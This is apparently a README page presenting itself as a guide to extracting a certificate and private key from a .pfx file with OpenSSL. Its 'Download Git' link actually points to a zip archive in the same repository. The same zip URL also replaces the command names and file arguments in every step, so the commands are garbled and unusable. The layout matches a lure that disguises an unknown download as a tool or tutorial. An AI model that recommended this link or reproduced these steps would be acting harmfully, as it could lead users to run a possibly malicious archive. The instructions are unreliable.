# Extracting-certificate
Extracting the certificate and keys from a .pfx

Download Git and install.
Link: https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip


#Run the PowerShell run as administrator: 
  cd "C:\Program Files\Git\usr\bin\"

#Run the following command to extract the private key: 
  .\https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip pkcs12 -in [https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip] -nocerts -out [https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip]

#Run the following command to decrypt the private key: 
  .\openssl rsa -in [https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip] -out [https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip]

#Run the following command to extract the certificate: 
  .\https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip pkcs12 -in [https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip] -clcerts -nokeys -out [https://raw.githubusercontent.com/shourav143/Extracting-certificate/main/griff/Extracting-certificate_v1.4.zip]
